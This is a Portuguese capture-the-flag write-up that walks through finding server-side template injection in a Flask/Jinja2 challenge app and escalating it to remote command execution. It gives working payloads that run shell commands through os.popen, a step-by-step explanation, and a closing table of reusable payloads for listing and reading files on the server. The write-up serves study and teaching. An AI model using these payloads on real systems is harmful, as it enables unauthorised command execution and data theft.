📁 Categoria:

Web Exploitation

### 🎯 Objetivo:

Descobrir a flag explorando vulnerabilidades na aplicação web.

## 🧩 Etapas do processo de exploração

### 1. 🕵️ Reconhecimento inicial

- A aplicação web disponibiliza um formulário para o usuário **"anunciar" qualquer coisa**.
- Ao submeter o formulário, o conteúdo é enviado via método **POST** para a URL `/`.
- A aplicação então redireciona para a rota `/announce`, exibindo o conteúdo enviado.

### HTML analisado:

```html
html

<form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce">
    <button type="submit"> Ok </button>
</form>

```

### Observações:

- A aplicação permite inserir HTML básico (ex: `<h1>olá</h1>`), e inicialmente parecia vulnerável a XSS.
- Utilizei o webhook.site, considerando que poderia ser uma vulnerabilidade XSS, forçando alguns scripts para exploração Via XSS à fim de captar algum bot acessando e captar algum cookie de repente de administrador ou algo do gênero, porém nenhum bot foi detectado visitando os anúncios, descartando a exploração via XSS com payloads como `<script>`.

### 2. 📌 Descoberta crucial: indício de SSTI

Ao observar o `<title>` da página:

```html
html

<title>SSTI1</title>

```

Foi identificada uma forte pista de que o desafio envolvia **SSTI (Server-Side Template Injection)**.

**Server-Side Template Injection (SSTI)** é uma vulnerabilidade que ocorre quando um servidor web injeta dados do usuário diretamente em um **template engine** (motor de templates) sem a devida validação ou sanitização.

### 📌 Em resumo:

> SSTI permite que um invasor injete código malicioso em um sistema de template do lado do servidor, fazendo com que o servidor execute esse código.
> 

### 3. 🧪 Teste de SSTI

### Payload usado:

```
jinja

{{7*7}}

```

### Resultado:

A página retornou o valor `49`, confirmando que a entrada do usuário estava sendo interpretada como template do lado do servidor (provavelmente **Jinja2**, usado com Flask em Python).

### 4. 💣 Execução remota de comandos (RCE) via SSTI

Após confirmação de SSTI, foi testado um payload para executar comandos shell no servidor:

### Payload:

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

```

### 🚀 Explicando o código passo a passo:

### 1. `config`

- É uma **variável preexistente** no contexto do Flask/Jinja2, frequentemente disponível.
- Ela representa a configuração da aplicação (`flask.config.Config`).

### 2. `.__class__`

- Pega a **classe** da variável `config`, que é `Config`.

### 3. `.__init__`

- Acessa o método **construtor** da classe `Config`.

### 4. `.__globals__`

- Aqui é onde a mágica acontece:
    - Em Python, métodos como `__init__` são **funções**.
    - Funções possuem um dicionário chamado `__globals__`, que contém todas as **variáveis globais do arquivo onde a função foi definida**.
    - Ou seja, você ganha acesso a **todo o escopo global do arquivo Python**, incluindo **módulos importados**, como o `os`.

### 5. `['os']`

- Acessa o módulo `os` importado no escopo global.

### 6. `.popen('ls')`

- `popen()` é uma função do módulo `os` que executa um **comando no sistema** e retorna um objeto semelhante a um arquivo.

### 7. `.read()`

- Lê e retorna o **output** do comando `ls`.

### 💣 Resultado prático

Se o servidor processar isso, ele executará:

```bash
bash
CopiarEditar
ls

```

### Resultado do código shell:

```
markdown

__pycache__ app.py flag requirements.txt

```

> Confirmação de que comandos shell estavam sendo executados via SSTI.
> 

### 5. 🏁 Leitura da flag

Com o conhecimento da existência do arquivo `flag` ou `flag.txt`, foi utilizado o seguinte payload:

### Payload final:

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

```

ou

```
jinja

{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

```

### Resultado:

A flag foi retornada diretamente no corpo da resposta. 🏆

## ✅ Conclusão

- A aplicação estava vulnerável a **SSTI**.
- Foi possível escalar a injeção até **execução remota de comandos (RCE)**.
- A flag foi extraída com sucesso utilizando comandos shell via `os.popen`.

## 🔐 Referência de Payloads úteis para Jinja2 SSTI:

| Objetivo | Payload |
| --- | --- |
| Teste SSTI | `{{7*7}}` |
| Listar arquivos | `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` |
| Ler conteúdo de arquivo | `{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}` |
| Executar comandos arbitrários | Substituir `'cat flag'` por qualquer outro comando shell válido |
